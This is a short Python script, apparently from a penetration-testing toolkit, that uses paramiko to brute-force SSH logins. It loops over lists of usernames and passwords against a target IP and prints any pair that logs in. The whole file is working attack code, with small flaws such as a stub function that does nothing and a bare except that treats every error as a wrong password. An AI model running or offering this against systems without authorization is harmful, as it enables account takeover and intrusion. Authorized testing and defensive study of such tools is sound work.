#!/usr/bin/env python3
import paramiko
import socket
import time

def brute_force_ssh_connection():
    print("starting_brute_force")


def ssh_test_all(machine, all_users, all_passwords):
    print('Testing SSH Service')
    client = paramiko.SSHClient()
    test_credentials(machine, client, all_users, all_passwords)


def test_credentials(machine, client, all_users, all_passwords):
    print("Testing default passwords and usernames for SSH")
    for user in all_users:
        for password in all_passwords:
            try:
                time.sleep(0.3)
                print(f"FINDING: SSH credentials: {user}:{password}")
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(machine.ip, username=user, password=password, banner_timeout=60)
                print(f"FOUND: SSH credentials: {user}:{password}")
            except paramiko.ssh_exception.AuthenticationException:
                print("wrong_password")
            except socket.error:
                print("Connection went wrong")
            except:
                print("wrong_password")
            client.close()
